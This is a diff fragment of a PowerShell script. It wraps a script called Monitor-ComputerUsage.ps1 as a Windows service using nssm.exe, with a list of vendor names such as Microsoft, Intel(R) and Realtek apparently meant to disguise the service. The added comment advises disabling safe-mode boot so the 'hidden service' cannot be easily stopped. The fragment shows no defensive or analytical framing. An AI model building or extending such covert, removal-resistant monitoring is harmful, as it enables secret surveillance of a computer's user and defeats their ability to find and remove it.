@@ -1,4 +1,7 @@
-﻿# Set variables.
+# Note: If you want to ensure that your hidden service will run, it is important to
+# disable the ability to boot Windows into safe mode.
+
+# Set variables.
 $NSSM_LOC = "C:\Users\Christensen\Downloads\nssm.exe"
 $SCRIPT_LOC = "C:\Users\Christensen\Downloads\Monitor-ComputerUsage.ps1"
 $BRANDS = @("Microsoft", "Windows", "Hyper-V", "Intel(R)", "Realtek", "Google", "Diagnostic", "Network")
